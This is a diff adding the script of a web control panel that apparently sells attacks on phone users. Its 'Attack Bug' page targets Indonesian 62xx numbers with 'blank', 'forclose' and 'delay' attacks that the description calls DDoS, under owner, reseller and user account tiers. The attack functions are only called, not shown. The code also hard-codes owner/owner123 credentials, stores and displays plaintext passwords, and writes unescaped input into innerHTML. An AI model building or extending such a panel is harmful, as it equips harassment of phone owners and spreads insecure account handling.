+  try {
+    attackStatus.textContent = `🚀 Starting ${attackType.toUpperCase()} attack on ${target}...`;
+    attackStatus.className = 'attack-status attack-loading';
+    
+    let result;
+    switch(attackType) {
+      case 'blank':
+        result = await blankAttack(target);
+        break;
+      case 'forclose':
+        result = await invisSqL(target);
+        break;
+      case 'delay':
+        result = await vikodelay2(target);
+        break;
+      default:
+        throw new Error('Unknown attack type');
+    }
+    
+    if (result.success) {
+      attackStatus.textContent = `✅ ${attackType.toUpperCase()} attack successful on ${target} for ${duration}s`;
+      attackStatus.className = 'attack-status attack-success';
+      showModal(`✅ ${attackType.toUpperCase()} attack berhasil!`);
+      addHistoryLog('attack_success', `${attackType} attack on ${target} for ${duration}s`);
+    } else {
+      throw new Error(result.message);
+    }
+  } catch (error) {
+    attackStatus.textContent = `❌ Attack failed: ${error.message}`;
+    attackStatus.className = 'attack-status attack-error';
+    showModal(`❌ Attack gagal: ${error.message}`);
+    addHistoryLog('attack_failed', `${attackType} attack failed on ${target}: ${error.message}`);
+  }
+}
+
+// ===== CLOUD & USER MANAGEMENT FUNCTIONS =====
+async function initializeSystem() {
+  console.log('🌐 Loading data from jsonbin.io...');
+
+  try {
+    const response = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}/latest`, {
+      headers: {
+        'X-Master-Key': JSONBIN_MASTER_KEY
+      }
+    });
+    
+    if (response.ok) {
+      const data = await response.json();
+      cloudData = data.record;
+      
+      if (cloudData.onlineUsers) {
+        onlineUsers = new Set(cloudData.onlineUsers);
+      }
+      
+      console.log('✅ Cloud data loaded:', cloudData);
+    } else {
+      console.log('❌ Bin not found, creating new data...');
+      await createInitialData();
+    }
+    
+  } catch (error) {
+    console.log('❌ Cloud error:', error);
+    loadLocalData();
+  }
+}
+
+async function createInitialData() {
+  const initialData = {
+    owners: [{ 
+      username: 'owner', 
+      password: 'owner123', 
+      role: 'owner', 
+      created: Date.now(),
+      createdBy: 'system'
+    }],
+    resellers: [],
+    users: [],
+    onlineUsers: [],
+    historyLogs: [],
+    lastSync: Date.now()
+  };
+
+  try {
+    const response = await fetch(`https://api.jsonbin.io/v3/b`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'X-Master-Key': JSONBIN_MASTER_KEY,
+        'X-Bin-Name': 'Neon Cloud Panel Data'
+      },
+      body: JSON.stringify(initialData)
+    });
+    
+    if (response.ok) {
+      const data = await response.json();
+      const newBinId = data.metadata.id;
+      localStorage.setItem('jsonbin_id', newBinId);
+      
+      cloudData = initialData;
+      console.log('✅ Initial data created on jsonbin.io');
+    } else {
+      console.log('❌ Failed to create initial data');
+      loadLocalData();
+    }
+  } catch (error) {
+    console.log('❌ Error creating initial data:', error);
+    loadLocalData();
+  }
+}
+
+async function saveToCloud() {
+  if (!cloudData) return false;
+  
+  cloudData.lastSync = Date.now();
+  cloudData.onlineUsers = Array.from(onlineUsers);
+  
+  try {
+    const binId = localStorage.getItem('jsonbin_id') || JSONBIN_BIN_ID;
+    const response = await fetch(`https://api.jsonbin.io/v3/b/${binId}`, {
+      method: 'PUT',
+      headers: {
+        'Content-Type': 'application/json',
+        'X-Master-Key': JSONBIN_MASTER_KEY
+      },
+      body: JSON.stringify(cloudData)
+    });
+    
+    if (response.ok) {
+      console.log('✅ Data saved to cloud');
+      return true;
+    } else {
+      console.log('❌ Cloud save failed');
+      return false;
+    }
+  } catch (error) {
+    console.log('❌ Cloud save error:', error);
+    return false;
+  }
+}
+
+function loadLocalData() {
+  const localData = localStorage.getItem('local_data');
+  if (localData) {
+    cloudData = JSON.parse(localData);
+    if (cloudData.onlineUsers) {
+      onlineUsers = new Set(cloudData.onlineUsers);
+    }
+  } else {
+    cloudData = {
+      owners: [{ 
+        username: 'owner', 
+        password: 'owner123', 
+        role: 'owner', 
+        created: Date.now(),
+        createdBy: 'system'
+      }],
+      resellers: [],
+      users: [],
+      onlineUsers: [],
+      historyLogs: [],
+      lastSync: Date.now()
+    };
+  }
+  console.log('📱 Using local data');
+}
+
+function showModal(text = "Berhasil", ms = 1500){
+  modalTitle.textContent = text;
+  modal.classList.add('show'); 
+  modal.setAttribute('aria-hidden','false');
+  setTimeout(()=> { 
+    modal.classList.remove('show'); 
+    modal.setAttribute('aria-hidden','true'); 
+  }, ms);
+}
+
+// Update UI based on user level
+function updateUIForUser(user) {
+  currentUser = user;
+  
+  document.getElementById('currentUsername').textContent = user.username;
+  document.getElementById('avatarInitial').textContent = user.username.charAt(0).toUpperCase();
+  
+  const roleBadge = document.getElementById('roleBadge');
+  roleBadge.textContent = user.role;
+  roleBadge.className = 'role-badge';
+  if (user.role === 'owner') {
+    roleBadge.classList.add('role-owner');
+    document.getElementById('currentRole').textContent = '@Owner';
+  } else if (user.role === 'reseller') {
+    roleBadge.classList.add('role-reseller');
+    document.getElementById('currentRole').textContent = '@Reseller';
+  } else {
+    roleBadge.classList.add('role-user');
+    document.getElementById('currentRole').textContent = '@User';
+  }
+  
+  // Mark user as online dan add history log
+  onlineUsers.add(user.username);
+  addHistoryLog('login', `${user.username} logged in`);
+  saveToCloud();
+  
+  // Start online status updates
+  startOnlineStatusTracking();
+  
+  updateMenuForUserLevel(user.role);
+  navigateTo('dashboard');
+}
+
+// Start tracking online status
+function startOnlineStatusTracking() {
+  if (onlineStatusInterval) clearInterval(onlineStatusInterval);
+  onlineStatusInterval = setInterval(updateOnlineStatus, 10000);
+  
+  if (syncInterval) clearInterval(syncInterval);
+  syncInterval = setInterval(loadOnlineUsers, 15000);
+}
+
+// Update menu based on user level
+function updateMenuForUserLevel(userLevel) {
+  const menuItems = menuStructure[userLevel] || menuStructure['user'];
+  
+  mainMenu.innerHTML = menuItems.map(item => `
+    <div class="menu-item" data-page="${item.page}" tabindex="0">
+      <div class="icon" aria-hidden="true">
+        ${iconMap[item.icon]}
+      </div>
+      <div class="menu-label">${item.label}</div>
+    </div>
+  `).join('');
+  
+  mainMenu.querySelectorAll('.menu-item').forEach(it => {
+    it.addEventListener('click', () => {
+      mainMenu.querySelectorAll('.menu-item').forEach(x => x.classList.remove('active'));
+      it.classList.add('active');
+      const page = it.dataset.page;
+      drawer.classList.remove('show'); 
+      drawerBack.classList.remove('show');
+      navigateTo(page);
+    });
+  });
+  
+  if (mainMenu.firstChild) {
+    mainMenu.firstChild.classList.add('active');
+  }
+}
+
+// Logout function
+function logout() {
+  if (currentUser) {
+    onlineUsers.delete(currentUser.username);
+    addHistoryLog('logout', `${currentUser.username} logged out`);
+    saveToCloud();
+  }
+  
+  if (onlineStatusInterval) {
+    clearInterval(onlineStatusInterval);
+    onlineStatusInterval = null;
+  }
+  if (syncInterval) {
+    clearInterval(syncInterval);
+    syncInterval = null;
+  }
+  
+  currentUser = null;
+  app.style.display = 'none';
+  app.setAttribute('aria-hidden','true');
+  loginScreen.style.display = 'flex';
+  
+  document.getElementById('loginUser').value = 'owner';
+  document.getElementById('loginPass').value = 'owner123';
+  loginError.style.display = 'none';
+  
+  drawer.classList.remove('show');
+  drawerBack.classList.remove('show');
+  
+  showModal('Logout berhasil!', 1500);
+}
+
+// Function untuk add history log
+function addHistoryLog(action, details, targetUser = null) {
+  const log = {
+    action,
+    details,
+    targetUser,
+    performedBy: currentUser.username,
+    timestamp: Date.now()
+  };
+  
+  cloudData.historyLogs.unshift(log);
+  if (cloudData.historyLogs.length > 100) {
+    cloudData.historyLogs = cloudData.historyLogs.slice(0, 100);
+  }
+  
+  saveToCloud();
+}
+
+// Function untuk update online status
+async function updateOnlineStatus() {
+  if (!currentUser) return;
+  
+  onlineUsers.add(currentUser.username);
+  await saveToCloud();
+  
+  if (currentPage === 'owner_menu' && currentTab === 'online') {
+    navigateTo(currentPage);
+  }
+}
+
+// Function untuk load online users dari cloud
+async function loadOnlineUsers() {
+  try {
+    const binId = localStorage.getItem('jsonbin_id') || JSONBIN_BIN_ID;
+    const response = await fetch(`https://api.jsonbin.io/v3/b/${binId}/latest`, {
+      headers: {
+        'X-Master-Key': JSONBIN_MASTER_KEY
+      }
+    });
+    
+    if (response.ok) {
+      const data = await response.json();
+      const remoteData = data.record;
+      
+      if (remoteData.onlineUsers) {
+        onlineUsers = new Set(remoteData.onlineUsers);
+        console.log('✅ Online users updated:', Array.from(onlineUsers));
+        
+        if (currentPage === 'owner_menu' && currentTab === 'online') {
+          navigateTo(currentPage);
+        }
+      }
+    }
+  } catch (error) {
+    console.log('❌ Error loading online users:', error);
+  }
+}
+
+// Login function
+async function doLogin(){
+  const username = document.getElementById('loginUser').value.trim();
+  const password = document.getElementById('loginPass').value.trim();
+  loginError.style.display = 'none';
+  
+  let user = null;
+  
+  user = cloudData.owners.find(u => u.username === username && u.password === password);
+  if (user) user.role = 'owner';
+  
+  if (!user) {
+    user = cloudData.resellers.find(u => u.username === username && u.password === password);
+    if (user) user.role = 'reseller';
+  }
+  
+  if (!user) {
+    user = cloudData.users.find(u => u.username === username && u.password === password);
+    if (user) user.role = 'user';
+  }
+  
+  if (user) {
+    currentUser = user;
+    loginScreen.style.display = 'none';
+    app.style.display = 'block';
+    app.setAttribute('aria-hidden','false');
+    updateUIForUser(user);
+  } else {
+    loginError.style.display = 'block';
+    const iu = document.getElementById('loginUser'), ip = document.getElementById('loginPass');
+    iu.classList.add('shake'); ip.classList.add('shake');
+    setTimeout(()=> { iu.classList.remove('shake'); ip.classList.remove('shake'); }, 400);
+  }
+}
+
+// Function to create account dengan custom username/password
+function createCustomAccount(role, username, password, createdBy) {
+  const allUsers = [...cloudData.owners, ...cloudData.resellers, ...cloudData.users];
+  if (allUsers.find(u => u.username === username)) {
+    showModal('Username sudah ada!');
+    return null;
+  }
+  
+  const newAccount = {
+    username,
+    password,
+    role,
+    created: Date.now(),
+    createdBy: createdBy.username
+  };
+  
+  if (role === 'reseller') {
+    cloudData.resellers.push(newAccount);
+  } else if (role === 'user') {
+    cloudData.users.push(newAccount);
+  }
+  
+  addHistoryLog('create_account', `Created ${role} account: ${username}`, username);
+  saveToCloud();
+  return newAccount;
+}
+
+// Function to delete account
+function deleteAccount(username, role) {
+  let account = null;
+  
+  if (role === 'reseller') {
+    account = cloudData.resellers.find(r => r.username === username);
+    cloudData.resellers = cloudData.resellers.filter(r => r.username !== username);
+    cloudData.users = cloudData.users.filter(u => u.createdBy !== username);
+  } else if (role === 'user') {
+    account = cloudData.users.find(u => u.username === username);
+    cloudData.users = cloudData.users.filter(u => u.username !== username);
+  }
+  
+  onlineUsers.delete(username);
+  
+  if (account) {
+    addHistoryLog('delete_account', `Deleted ${role} account: ${username} (Created: ${new Date(account.created).toLocaleString()})`, username);
+  }
+  
+  saveToCloud();
+  showModal('Account deleted!');
+  navigateTo(currentPage);
+}
+
+// Navigation function
+function navigateTo(page) {
+  currentPage = page;
+  pageTitle.textContent = page.charAt(0).toUpperCase() + page.slice(1).replace('_', ' ');
+  
+  let content = '';
+  
+  switch(page) {
+    case 'dashboard':
+      content = `
+        <div class="card">
+          <h2>Dashboard</h2>
+          <p class="muted">Welcome back, ${currentUser.username}!</p>
+          <div class="grid">
+            <div class="col">
+              <h3>Your Info</h3>
+              <p>Role: <span class="role-badge role-${currentUser.role}">${currentUser.role}</span></p>
+              <p>Username: ${currentUser.username}</p>
+              <p class="online">
+                <span class="status-dot"></span>
+                Online (Logged In)
+              </p>
+            </div>
+            <div class="col">
+              <h3>System Stats</h3>
+              <p>Total Resellers: ${cloudData.resellers.length}</p>
+              <p>Total Users: ${cloudData.users.length}</p>
+              <p>Currently Online: ${onlineUsers.size} users</p>
+            </div>
+          </div>
+        </div>
+      `;
+      break;
+      
+    case 'attack_bug':
+      content = `
+        <div class="card">
+          <h2>Attack Bug Menu</h2>
+          <p class="muted">Launch DDoS attacks - Target Indonesia 62xx</p>
+          
+          <input class="pill" placeholder="Target 62xx (contoh: 628123456789)" id="attackTarget">
+          
+          <div style="margin:12px 0">
+            <label style="display:block;margin-bottom:6px;color:#f3c8cf;font-size:13px">Attack Type</label>
+            <div class="opt-row">
+              <div class="opt ${attackType === 'blank' ? 'selected' : ''}" onclick="selectAttackType('blank')">BLANK</div>
+              <div class="opt ${attackType === 'forclose' ? 'selected' : ''}" onclick="selectAttackType('forclose')">FORCLOSE</div>
+              <div class="opt ${attackType === 'delay' ? 'selected' : ''}" onclick="selectAttackType('delay')">DELAY</div>
+            </div>
+          </div>
+          
+          <input class="pill" placeholder="Duration (seconds)" style="margin-top:10px" id="attackDuration">
+          <button class="neon-btn" style="margin-top:12px;width:100%" onclick="startAttack()">START ATTACK</button>
+          <div id="attackStatus"></div>
+        </div>
+      `;
+      break;
+      
+    case 'userbot':
+      content = `
+        <div class="card">
+          <h2>Create User Bot</h2>
+          <p class="muted">Create automated user bots</p>
+          <input class="pill" placeholder="Bot Name">
+          <input class="pill" placeholder="Target" style="margin-top:10px">
+          <button class="neon-btn" style="margin-top:12px;width:100%">CREATE BOT</button>
+        </div>
+      `;
+      break;
+      
+    case 'owner_menu':
+      if (currentUser.role !== 'owner') {
+        content = `<div class="card"><h2>Access Denied</h2><p class="muted">Only owner can access this menu.</p></div>`;
+      } else {
+        const allAccounts = [...cloudData.resellers, ...cloudData.users];
+        content = `
+          <div class="card">
+            <h2>Owner Menu</h2>
+            <p class="muted">Manage resellers and users - Real-time Online Status</p>
+            <div class="tabs">
+              <div class="tab ${currentTab === 'create' ? 'active' : ''}" onclick="switchTab('create')">Create Account</div>
+              <div class="tab ${currentTab === 'manage' ? 'active' : ''}" onclick="switchTab('manage')">Manage Accounts</div>
+              <div class="tab ${currentTab === 'online' ? 'active' : ''}" onclick="switchTab('online')">Online Users (${onlineUsers.size})</div>
+            </div>
+            
+            ${currentTab === 'create' ? `
+              <div class="grid">
+                <div class="col">
+                  <h3>Create Reseller</h3>
+                  <input id="resellerUsername" class="pill" placeholder="Username">
+                  <input id="resellerPassword" type="password" class="pill" placeholder="Password" style="margin-top:10px">
+                  <button class="neon-btn" style="margin-top:12px;width:100%" onclick="createCustomReseller()">CREATE RESELLER</button>
+                </div>
+                <div class="col">
+                  <h3>Create User</h3>
+                  <input id="userUsername" class="pill" placeholder="Username">
+                  <input id="userPassword" type="password" class="pill" placeholder="Password" style="margin-top:10px">
+                  <button class="neon-btn" style="margin-top:12px;width:100%" onclick="createCustomUser()">CREATE USER</button>
+                </div>
+              </div>
+              <div id="createResult" style="margin-top:12px"></div>
+            ` : ''}
+            
+            ${currentTab === 'manage' ? `
+              <h3>All Accounts (${allAccounts.length})</h3>
+              <div class="list">
+                ${allAccounts.map(acc => `
+                  <div class="acct">
+                    <div>
+                      <strong>${acc.username}</strong>
+                      <span class="role-badge role-${acc.role}">${acc.role}</span>
+                      <br>
+                      <small>Password: ${acc.password} | Created: ${new Date(acc.created).toLocaleString()} by ${acc.createdBy}</small>
+                      <br>
+                      <small class="${onlineUsers.has(acc.username) ? 'online' : 'offline'}">
+                        <span class="status-dot"></span>
+                        ${onlineUsers.has(acc.username) ? 'Online (Logged In)' : 'Offline (Not Logged In)'}
+                      </small>
+                    </div>
+                    <button class="delete-btn" onclick="deleteAccount('${acc.username}', '${acc.role}')">DELETE</button>
+                  </div>
+                `).join('')}
+              </div>
+            ` : ''}
+            
+            ${currentTab === 'online' ? `
+              <h3>Currently Online Users (${onlineUsers.size})</h3>
+              <p class="muted">Users yang sedang login saat ini</p>
+              <div class="list">
+                ${allAccounts
+                  .filter(acc => onlineUsers.has(acc.username))
+                  .map(acc => `
+                  <div class="acct">
+                    <div>
+                      <strong>${acc.username}</strong>
+                      <span class="role-badge role-${acc.role}">${acc.role}</span>
+                      <br>
+                      <small>Role: ${acc.role} | Created by: ${acc.createdBy}</small>
+                      <br>
+                      <small class="online">
+                        <span class="status-dot"></span>
+                        Online - Last active: Just now
+                      </small>
+                    </div>
+                    <span class="online">
+                      ACTIVE
+                    </span>
+                  </div>
+                `).join('')}
+                
+                ${onlineUsers.size === 0 ? `
+                  <div style="text-align:center;padding:20px;color:var(--muted)">
+                    No users currently online
+                  </div>
+                ` : ''}
+              </div>
+              <button class="neon-btn" style="margin-top:12px;width:100%" onclick="loadOnlineUsers()">REFRESH ONLINE STATUS</button>
+            ` : ''}
+          </div>
+        `;
+      }
+      break;
+      
+    case 'reseller_menu':
+      if (currentUser.role === 'user') {
+        content = `<div class="card"><h2>Access Denied</h2><p class="muted">Only resellers and above can access this menu.</p></div>`;
+      } else {
+        const myUsers = cloudData.users.filter(u => u.createdBy === currentUser.username);
+        content = `
+          <div class="card">
+            <h2>Reseller Menu</h2>
+            <p class="muted">Manage your users - Real-time Online Status</p>
+            <div class="tabs">
+              <div class="tab ${currentTab === 'create' ? 'active' : ''}" onclick="switchTab('create')">Create User</div>
+              <div class="tab ${currentTab === 'manage' ? 'active' : ''}" onclick="switchTab('manage')">My Users (${myUsers.length})</div>
+            </div>
+            
+            ${currentTab === 'create' ? `
+              <div>
+                <h3>Create User</h3>
+                <input id="resellerUserUsername" class="pill" placeholder="Username">
+                <input id="resellerUserPassword" type="password" class="pill" placeholder="Password" style="margin-top:10px">
+                <button class="neon-btn" style="margin-top:12px;width:100%" onclick="createCustomUserAsReseller()">CREATE USER</button>
+                <div id="resellerCreateResult" style="margin-top:12px"></div>
+              </div>
+            ` : ''}
+            
+            ${currentTab === 'manage' ? `
+              <h3>My Users (${myUsers.length})</h3>
+              <div class="list">
+                ${myUsers.map(user => `
+                  <div class="acct">
+                    <div>
+                      <strong>${user.username}</strong>
+                      <span class="role-badge role-${user.role}">${user.role}</span>
+                      <br>
+                      <small>Password: ${user.password} | Created: ${new Date(user.created).toLocaleString()}</small>
+                      <br>
+                      <small class="${onlineUsers.has(user.username) ? 'online' : 'offline'}">
+                        <span class="status-dot"></span>
+                        ${onlineUsers.has(user.username) ? 'Online (Logged In)' : 'Offline (Not Logged In)'}
+                      </small>
+                    </div>
+                    <button class="delete-btn" onclick="deleteAccount('${user.username}', '${user.role}')">DELETE</button>
+                  </div>
+                `).join('')}
+              </div>
+            ` : ''}
+          </div>
+        `;
+      }
+      break;
+      
+    case 'user_menu':
+      content = `
+        <div class="card">
+          <h2>User Menu</h2>
+          <p class="muted">User management and tools</p>
+          <div class="grid">
+            <div class="col">
+              <h3>Account Info</h3>
+              <p>Username: ${currentUser.username}</p>
+              <p>Password: ${currentUser.password}</p>
+              <p>Role: <span class="role-badge role-${currentUser.role}">${currentUser.role}</span></p>
+              <p>Created: ${new Date(currentUser.created).toLocaleString()}</p>
+              <p class="online">
+                <span class="status-dot"></span>
+                Online (Logged In)
+              </p>
+            </div>
+            <div class="col">
+              <h3>Tools</h3>
+              <button class="neon-btn" style="width:100%;margin-bottom:8px">PROFILE SETTINGS</button>
+              <button class="neon-btn" style="width:100%">HISTORY LOGS</button>
+            </div>
+          </div>
+        </div>
+      `;
+      break;
+      
+    case 'history_logs':
+      content = `
+        <div class="card">
+          <h2>History Logs</h2>
+          <p class="muted">Activity history - Create, Delete, Login, Logout, Attacks</p>
+          <div class="list">
+            ${cloudData.historyLogs.map(log => `
+              <div class="history-item history-${log.action.split('_')[0]}">
+                <div><strong>${log.action.replace('_', ' ').toUpperCase()}</strong></div>
+                <div>${log.details}</div>
+                <small>By: ${log.performedBy} | ${new Date(log.timestamp).toLocaleString()}</small>
+              </div>
+            `).join('')}
+            
+            ${cloudData.historyLogs.length === 0 ? `
+              <div style="text-align:center;padding:20px;color:var(--muted)">
+                No history logs yet
+              </div>
+            ` : ''}
+          </div>
+        </div>
+      `;
+      break;
+      
+    case 'settings':
+      content = `
+        <div class="card">
+          <h2>Settings</h2>
+          <p class="muted">System settings and configuration</p>
+          <div class="grid">
+            <div class="col">
+              <h3>Cloud Sync</h3>
+              <button class="neon-btn" style="width:100%;margin-bottom:8px" onclick="saveToCloud()">SAVE TO CLOUD</button>
+              <p>Last Sync: ${cloudData ? new Date(cloudData.lastSync).toLocaleString() : 'Never'}</p>
+              <p>Online Users: ${onlineUsers.size}</p>
+            </div>
+            <div class="col">
+              <h3>Appearance</h3>
+              <select class="pill">
+                <option>Dark Theme</option>
+                <option>Light Theme</option>
+              </select>
+            </div>
+          </div>
+        </div>
+      `;
+      break;
+      
+    default:
+      content = `<div class="card"><h2>Page Not Found</h2><p class="muted">Halaman tidak ditemukan.</p></div>`;
+  }
+  
+  panelRoot.innerHTML = content;
+}
+
+// Tab switching function
+function switchTab(tabName) {
+  currentTab = tabName;
+  navigateTo(currentPage);
+}
+
+// Attack type selection
+function selectAttackType(type) {
+  attackType = type;
+  navigateTo('attack_bug');
+}
+
+// Create custom reseller
+function createCustomReseller() {
+  const username = document.getElementById('resellerUsername').value.trim();
+  const password = document.getElementById('resellerPassword').value.trim();
+  
+  if (!username || !password) {
+    showModal('Username dan password harus diisi!');
+    return;
+  }
+  
+  const newReseller = createCustomAccount('reseller', username, password, currentUser);
+  if (newReseller) {
+    document.getElementById('createResult').innerHTML = `
+      <div style="background:rgba(255,115,0,0.1);padding:12px;border-radius:8px;margin-top:10px">
+        <h4>Reseller Created!</h4>
+        <p><strong>Username:</strong> ${newReseller.username}</p>
+        <p><strong>Password:</strong> ${newReseller.password}</p>
+        <p><strong>Role:</strong> Reseller</p>
+        <p><strong>Created:</strong> ${new Date(newReseller.created).toLocaleString()}</p>
+      </div>
+    `;
+    showModal('Reseller created!');
+    document.getElementById('resellerUsername').value = '';
+    document.getElementById('resellerPassword').value = '';
+  }
+}
+
+// Create custom user
+function createCustomUser() {
+  const username = document.getElementById('userUsername').value.trim();
+  const password = document.getElementById('userPassword').value.trim();
+  
+  if (!username || !password) {
+    showModal('Username dan password harus diisi!');
+    return;
+  }
+  
+  const newUser = createCustomAccount('user', username, password, currentUser);
+  if (newUser) {
+    document.getElementById('createResult').innerHTML = `
+      <div style="background:rgba(0,162,255,0.1);padding:12px;border-radius:8px;margin-top:10px">
+        <h4>User Created!</h4>
+        <p><strong>Username:</strong> ${newUser.username}</p>
+        <p><strong>Password:</strong> ${newUser.password}</p>
+        <p><strong>Role:</strong> User</p>
+        <p><strong>Created:</strong> ${new Date(newUser.created).toLocaleString()}</p>
+      </div>
+    `;
+    showModal('User created!');
+    document.getElementById('userUsername').value = '';
+    document.getElementById('userPassword').value = '';
+  }
+}
+
+// Create custom user as reseller
+function createCustomUserAsReseller() {
+  const username = document.getElementById('resellerUserUsername').value.trim();
+  const password = document.getElementById('resellerUserPassword').value.trim();
+  
+  if (!username || !password) {
+    showModal('Username dan password harus diisi!');
+    return;
+  }
+  
+  const newUser = createCustomAccount('user', username, password, currentUser);
+  if (newUser) {
+    document.getElementById('resellerCreateResult').innerHTML = `
+      <div style="background:rgba(0,162,255,0.1);padding:12px;border-radius:8px;margin-top:10px">
+        <h4>User Created!</h4>
+        <p><strong>Username:</strong> ${newUser.username}</p>
+        <p><strong>Password:</strong> ${newUser.password}</p>
+        <p><strong>Role:</strong> User</p>
+        <p><strong>Created:</strong> ${new Date(newUser.created).toLocaleString()}</p>
+      </div>
+    `;
+    showModal('User created!');
+    document.getElementById('resellerUserUsername').value = '';
+    document.getElementById('resellerUserPassword').value = '';
+  }
+}
+
+// Event Listeners
+hamb.addEventListener('click', ()=> { 
+  drawer.classList.add('show'); 
+  drawerBack.classList.add('show'); 
+  drawer.setAttribute('aria-hidden','false'); 
+  drawerBack.setAttribute('aria-hidden','false'); 
+});
+
+drawerBack.addEventListener('click', ()=> { 
+  drawer.classList.remove('show'); 
+  drawerBack.classList.remove('show'); 
+  drawer.setAttribute('aria-hidden','true'); 
+  drawerBack.setAttribute('aria-hidden','true'); 
+});
+
+btnLogin.addEventListener('click', doLogin);
+document.getElementById('loginPass').addEventListener('keydown', (e)=> { if(e.key === 'Enter') doLogin(); });
+document.getElementById('loginUser').addEventListener('keydown', (e)=> { if(e.key === 'Enter') doLogin(); });
+
+btnLogout.addEventListener('click', logout);
+
+// Initialize system
+document.addEventListener('DOMContentLoaded', initializeSystem);
+
+// Auto-save every 30 seconds
+setInterval(() => {
+  if (currentUser && cloudData) {
+    saveToCloud();
+  }
+}, 30000);
+</script>
+</body>
+</html>
